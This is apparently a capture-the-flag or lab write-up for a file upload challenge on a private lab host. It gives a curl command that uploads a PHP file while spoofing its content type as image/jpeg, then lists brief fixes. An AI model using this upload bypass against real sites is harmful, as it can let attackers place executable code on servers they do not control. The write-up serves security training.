# 08-Add_Image_Upload

The upload field can take php file types

## The approach

-Go to http://192.168.101.204/?page=upload  

-Test and upload different types of files and you will notice it accepts other files types apart from just JPG.

## The Exploit #

we use Curl to run our script.sh 
```bash
curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@empty.php;type=image/jpeg' http://192.168.101.204/index.php\?page\=upload\#


## The solution

- Use strict types when uploading files. Validate file type 
- validate user inputs from back end before proceeding.
